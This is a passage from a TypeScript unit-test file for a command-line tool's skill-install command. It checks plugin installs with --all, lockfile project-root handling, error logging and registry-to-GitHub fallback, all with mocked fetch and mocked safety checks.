        return { ok: true, text: async () => marketplaceJson, json: async () => JSON.parse(marketplaceJson) };
      }
      // Make the second plugin (backend) return no skills
      if (url.includes("/contents/plugins/backend/skills")) {
        return { ok: true, json: async () => [] };
      }
      if (url.includes("/contents/plugins/backend/commands")) {
        return { ok: true, json: async () => [] };
      }
      if (url.includes("/contents/plugins/") && url.includes("/skills")) {
        return {
          ok: true,
          json: async () => [{ name: "skill-one", type: "dir" }],
        };
      }
      if (url.includes("/contents/plugins/") && url.includes("/commands")) {
        return { ok: true, json: async () => [] };
      }
      if (url.includes("/SKILL.md")) {
        return { ok: true, text: async () => "# Test Skill\nContent" };
      }
      return { ok: false };
    }) as unknown as typeof fetch;

    await addCommand(undefined, { repo: "anton-abyzov/vskill", all: true });

    // Should still install frontend and testing (backend fails)
    // lockfile written at least twice (for frontend and testing)
    expect(mockWriteLockfile.mock.calls.length).toBeGreaterThanOrEqual(2);
  });

  it("exits with error when --all used without --repo", async () => {
    const exitSpy = vi.spyOn(process, "exit").mockImplementation(() => { throw new Error("exit"); });

    try {
      await addCommand(undefined, { all: true });
    } catch { /* expected */ }

    expect(exitSpy).toHaveBeenCalledWith(1);
    exitSpy.mockRestore();
  });

  it("does not require source argument when --repo --all is used", async () => {
    setupAllHappyPath();

    // source is undefined — should work fine with --repo --all
    await addCommand(undefined, { repo: "anton-abyzov/vskill", all: true });

    // Should not throw — verify plugins were installed
    expect(mockWriteLockfile).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Project root consistency — lockfile and skills use the same base dir
// ---------------------------------------------------------------------------

describe("addCommand project root consistency", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("passes projectRoot to ensureLockfile and writeLockfile in discovery flow", async () => {
    const projectRoot = "/home/user/my-project";
    mockFindProjectRoot.mockReturnValue(projectRoot);
    mockDiscoverSkills.mockResolvedValue([
      { name: "skill-a", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/o/r/main/SKILL.md" },
    ]);

    await addCommand("owner/repo", {});

    // Lockfile calls must receive projectRoot as dir argument
    expect(mockEnsureLockfile).toHaveBeenCalledWith(projectRoot);
    expect(mockWriteLockfile).toHaveBeenCalledWith(expect.anything(), projectRoot);
  });

  it("passes projectRoot to ensureLockfile and writeLockfile in single-skill legacy flow", async () => {
    const projectRoot = "/home/user/my-project";
    mockFindProjectRoot.mockReturnValue(projectRoot);

    await addCommand("owner/repo/my-skill", {});

    expect(mockEnsureLockfile).toHaveBeenCalledWith(projectRoot);
    expect(mockWriteLockfile).toHaveBeenCalledWith(expect.anything(), projectRoot);
  });

  it("passes projectRoot to ensureLockfile and writeLockfile in registry flow with content", async () => {
    const projectRoot = "/home/user/my-project";
    mockFindProjectRoot.mockReturnValue(projectRoot);
    mockGetSkill.mockResolvedValue({
      name: "my-skill",
      author: "alice",
      version: "1.0.0",
      content: "# My Skill",
      installs: 0,
      updatedAt: "",
    });

    await addCommand("my-skill", {});

    expect(mockEnsureLockfile).toHaveBeenCalledWith(projectRoot);
    expect(mockWriteLockfile).toHaveBeenCalledWith(expect.anything(), projectRoot);
  });

  it("canonical installer and lockfile both use same projectRoot in discovery flow", async () => {
    const projectRoot = "/home/user/deep/project";
    mockFindProjectRoot.mockReturnValue(projectRoot);
    mockDiscoverSkills.mockResolvedValue([
      { name: "alpha", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/o/r/main/SKILL.md" },
    ]);

    await addCommand("owner/repo", {});

    // Canonical installer receives same projectRoot
    expect(mockInstallSymlink).toHaveBeenCalled();
    const installOpts = mockInstallSymlink.mock.calls[0][3];
    expect(installOpts.projectRoot).toBe(projectRoot);

    // Lockfile also receives same projectRoot
    expect(mockEnsureLockfile).toHaveBeenCalledWith(projectRoot);
  });
});

// ---------------------------------------------------------------------------
// Error handling — installOneGitHubSkill must not silently swallow errors
// ---------------------------------------------------------------------------

describe("addCommand error handling in discovery flow", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockFindProjectRoot.mockReturnValue(process.cwd());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("logs error and marks skill as not installed when canonical installer throws", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "broken", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/o/r/main/SKILL.md" },
    ]);

    mockInstallSymlink.mockImplementation(() => {
      throw new Error("EACCES: permission denied");
    });

    await addCommand("owner/repo", {});

    // Error should be logged (not swallowed)
    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("Failed to install");
    expect(errorOutput).toContain("EACCES");

    // Skill should NOT appear in lockfile
    const lockArg = mockWriteLockfile.mock.calls[0]?.[0] as { skills: Record<string, unknown> } | undefined;
    if (lockArg) {
      expect(lockArg.skills).not.toHaveProperty("broken");
    }
  });
});

// ---------------------------------------------------------------------------
// Flat name deprecation — tip message for owner/repo format
// ---------------------------------------------------------------------------

describe("addCommand flat name identifier guidance", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockFindProjectRoot.mockReturnValue(process.cwd());
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("shows format tip when source is a flat name going to registry", async () => {
    mockGetSkill.mockResolvedValue({
      name: "my-skill",
      author: "alice",
      version: "1.0.0",
      content: "# My Skill",
      installs: 0,
      updatedAt: "",
    });

    await addCommand("my-skill", {});

    const logOutput = (console.log as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(logOutput).toContain("owner/repo");
  });

  it("shows resolution hint when registry falls back to GitHub", async () => {
    mockGetSkill.mockResolvedValue({
      name: "remotion-dev-skills-remotion",
      author: "remotion-dev",
      content: undefined,
      repoUrl: "https://github.com/remotion-dev/skills",
      installs: 0,
      updatedAt: "",
    });

    mockDiscoverSkills.mockResolvedValue([
      { name: "remotion", path: "skills/remotion/SKILL.md", rawUrl: "https://raw.githubusercontent.com/remotion-dev/skills/main/skills/remotion/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Remotion skill",
    }) as unknown as typeof fetch;

    await addCommand("remotion-dev-skills-remotion", {});

    const logOutput = (console.log as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    // Should suggest the direct format including skill name
    expect(logOutput).toContain("remotion-dev/skills/remotion-dev-skills-remotion");
  });
});

// ---------------------------------------------------------------------------
// Registry → GitHub fallback: auto-select matching skill (_targetSkill)
// ---------------------------------------------------------------------------

describe("addCommand registry fallback auto-selects matching skill", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockFindProjectRoot.mockReturnValue(process.cwd());
    // Reset canonical installer (earlier test overrides with throwing impl)
    mockInstallSymlink.mockReturnValue([]);
    mockInstallCopy.mockReturnValue([]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("auto-selects matching skill from multi-skill repo (installs 1, not all)", async () => {
    mockGetSkill.mockResolvedValue({
      name: "excalidraw-diagram-generator",
      author: "github",
      content: undefined,
      repoUrl: "https://github.com/github/awesome-copilot",
      installs: 100,
      updatedAt: "2026-02-20T00:00:00Z",
    });

    mockDiscoverSkills.mockResolvedValue([
      { name: "code-review", path: "skills/code-review/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/awesome-copilot/main/skills/code-review/SKILL.md" },
      { name: "excalidraw-diagram-generator", path: "skills/excalidraw-diagram-generator/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/awesome-copilot/main/skills/excalidraw-diagram-generator/SKILL.md" },
      { name: "unit-test-writer", path: "skills/unit-test-writer/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/awesome-copilot/main/skills/unit-test-writer/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Excalidraw Diagram Generator",
    }) as unknown as typeof fetch;

    await addCommand("excalidraw-diagram-generator", {});

    // Should only install 1 skill, not all 3
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(1);
    expect(lockArg.skills).toHaveProperty("excalidraw-diagram-generator");
    expect(lockArg.skills).not.toHaveProperty("code-review");
    expect(lockArg.skills).not.toHaveProperty("unit-test-writer");
  });

  it("aborts in non-TTY when registry name does not match any discovered skill", async () => {
    mockGetSkill.mockResolvedValue({
      name: "remotion-dev-skills-remotion",
      author: "remotion-dev",
      content: undefined,
      repoUrl: "https://github.com/remotion-dev/skills",
      installs: 0,
      updatedAt: "2026-02-20T00:00:00Z",
    });

    // Registry name "remotion-dev-skills-remotion" does NOT match dir names
    mockDiscoverSkills.mockResolvedValue([
      { name: "remotion", path: "skills/remotion/SKILL.md", rawUrl: "https://raw.githubusercontent.com/remotion-dev/skills/main/skills/remotion/SKILL.md" },
      { name: "video-editor", path: "skills/video-editor/SKILL.md", rawUrl: "https://raw.githubusercontent.com/remotion-dev/skills/main/skills/video-editor/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    // Non-TTY + no match → should abort, not install all
    await expect(
      addCommand("remotion-dev-skills-remotion", {}),
    ).rejects.toThrow("process.exit");

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("not found among 2 skills");
    expect(errorOutput).toContain("remotion, video-editor");

    mockExit.mockRestore();
  });

  it("auto-selects with case-insensitive match (registry slug vs directory name)", async () => {
    mockGetSkill.mockResolvedValue({
      name: "code-review",
      author: "github",
      content: undefined,
      repoUrl: "https://github.com/github/copilot-skills",
      installs: 50,
      updatedAt: "2026-02-20T00:00:00Z",
    });

    // Directory has mixed case — registry slug is lowercase
    mockDiscoverSkills.mockResolvedValue([
      { name: "Code-Review", path: "skills/Code-Review/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/copilot-skills/main/skills/Code-Review/SKILL.md" },
      { name: "unit-test", path: "skills/unit-test/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/copilot-skills/main/skills/unit-test/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Code Review Skill",
    }) as unknown as typeof fetch;

    await addCommand("code-review", {});

    // Should auto-select only Code-Review, not unit-test
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(1);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(1);
    expect(lockArg.skills).toHaveProperty("Code-Review");
    expect(lockArg.skills).not.toHaveProperty("unit-test");
  });

  it("tip message suggests 3-part owner/repo/skill format", async () => {
    mockGetSkill.mockResolvedValue({
      name: "excalidraw-diagram-generator",
      author: "github",
      content: undefined,
      repoUrl: "https://github.com/github/awesome-copilot",
      installs: 0,
      updatedAt: "2026-02-20T00:00:00Z",
    });

    mockDiscoverSkills.mockResolvedValue([
      { name: "excalidraw-diagram-generator", path: "skills/excalidraw-diagram-generator/SKILL.md", rawUrl: "https://raw.githubusercontent.com/github/awesome-copilot/main/skills/excalidraw-diagram-generator/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    await addCommand("excalidraw-diagram-generator", {});

    const logOutput = (console.log as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(logOutput).toContain("github/awesome-copilot/excalidraw-diagram-generator");
  });

  it("does not auto-filter when _targetSkill is not set (direct owner/repo)", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "skill-a", path: "skills/skill-a/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/skill-a/SKILL.md" },
      { name: "skill-b", path: "skills/skill-b/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/skill-b/SKILL.md" },
    ]);

    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    // Direct install without registry — no _targetSkill
    await addCommand("owner/repo", {});

    // Both skills should be installed
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(2);
    const lockArg = mockWriteLockfile.mock.calls[0][0];
    expect(Object.keys(lockArg.skills)).toHaveLength(2);
  });
});
